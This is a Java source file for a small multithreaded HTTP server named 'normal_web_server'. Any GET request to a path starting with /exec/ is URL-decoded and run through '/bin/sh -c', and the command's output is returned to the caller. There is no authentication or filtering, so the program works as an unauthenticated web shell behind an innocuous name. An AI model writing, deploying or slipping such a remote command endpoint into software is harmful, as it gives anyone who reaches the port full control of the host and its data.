import java.net.*;
import java.sql.Time;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.io.*;

public class normal_web_server extends Thread {

	public static void main(String[] args) {
		int port = Integer.parseInt(args[0]);
		try {
			Thread t = new Thread(new server(port));
			t.start();
		} catch (IOException e) {
			e.printStackTrace();
			System.out.println("fail to open serversocket on port "+port);
		}
	}
}

class server implements Runnable {

	private ServerSocket serverSocket;

	public server(int port) throws IOException {
		serverSocket = new ServerSocket(port);
		// serverSocket.setSoTimeout(30000);
	}

	@Override
	public void run() {
		Socket socket;
		while (true) {
			try {
				socket = serverSocket.accept();
				if (socket != null) {
					new Thread(new TestReveiveThread(socket)).start();
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

	}

}

class TestReveiveThread implements Runnable {
	Socket socket;
	public TestReveiveThread(Socket s) {
		socket = s;
	}

	public void run() {
		try {
			boolean iscommand = true;
			BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream(), "utf-8"));
			OutputStream os = socket.getOutputStream();
			String line = "";
			line = bufferedReader.readLine().trim();
			System.out.println(line);
			line = URLDecoder.decode(line, "UTF-8");
			String[] firstline = line.split(" ");
			String res = "";
			boolean isget = firstline[0].equals("GET");
			boolean ishttp = firstline[firstline.length - 1].equals("HTTP/1.1");
			boolean len = firstline.length >= 3;
			String command = "";
			for (int i = 1; i <= firstline.length - 2; i++) {
				command += firstline[i] + " ";
			}
			command = command.trim();
			boolean ispath = (command.indexOf("/exec/") == 0);

			if (!len || !isget || !ispath || !ishttp) {
				iscommand = false;
				res = "Command Not Found!\r\n";
			}

			if (iscommand) {
				if (command.length() > 6) { 
					String in = command.substring(6);
					res = getoutputs(in);// is a command
				} else {//this means command's length is 6, empty path
					iscommand = false;
					res = "Command Not Found!\r\n";
				}
			}
			StringBuilder sb=new StringBuilder();
			String firstl="";
			if(iscommand){
				firstl="HTTP/1.1 200 OK\r\n";
			}else{
				firstl="HTTP/1.1 404 Not Found\r\n";
			}
			sb.append(firstl);
			sb.append("Content-Type: text/html; charset=UTF-8\r\n\r\n");
			sb.append(res);
			os.write(sb.toString().getBytes());
			System.out.println("send back http package!\n" + sb.toString());
			bufferedReader.close();
			os.close();
			socket.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static String getoutputs(String in) {
		String res = "";
		try {
			String[] command = { "/bin/sh", "-c", in.trim()};
			final Process p = Runtime.getRuntime().exec(command);  
			
	        new Thread(new Runnable() {  
	  
	            @Override  
	            public void run() {  
	                BufferedReader br = new BufferedReader(  
	                        new InputStreamReader(p.getErrorStream()));  
	                try {  
	                    while (br.readLine() != null)  
	                        ;  //leave the error alone
	                    br.close();  
	                } catch (IOException e) {  
	                    e.printStackTrace();  
	                }  
	            }  
	        }).start();  
	        BufferedReader br = null;  
	        br = new BufferedReader(new InputStreamReader(p.getInputStream()));  
	        String line = null;  
	        while ((line = br.readLine()) != null) {  
	            res+= line+"\n";
	        }  
	        p.waitFor();  
	        br.close();  
	        p.destroy(); 
			
		} catch (java.io.IOException e) {
			res = e.toString();
			e.printStackTrace();
		} catch(Exception ex){
			res = ex.toString();
			ex.printStackTrace();
		}
		return res;
	}
}

